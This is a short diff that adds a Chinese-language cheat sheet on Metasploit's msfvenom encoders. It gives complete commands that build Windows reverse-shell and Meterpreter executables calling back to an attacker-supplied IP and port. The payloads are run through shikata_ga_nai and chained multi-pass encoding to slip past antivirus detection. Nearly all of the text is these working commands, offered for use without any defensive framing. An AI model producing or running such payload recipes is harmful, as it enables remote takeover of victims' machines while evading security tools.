@@ -1,0 +1,17 @@
+使用msf编码器
+msfvenom -h    //查看msf编码器的各种参数
+
+msfvenom -I encoders   //列出所有可用的编码格式
+
+列：
+msfvenom -p windows/shell_reverse_tcp 
+LHOST=<your ip> LPORT=<your port>
+-e x86/shikata_ga_nai -f exe -o payload2.exe
+
+多重编码
+msfvenom -p windows/meterpreter/reverse_tcp
+LHOST=<your ip> LPORT=<your port> -e x86/shikata_ga_nai
+-a x86 --platform windows -i 10 -f raw | msfvenom
+-e x86/countdown -a x86 --platform windows -i 10
+-f exe -o playload.exe
+
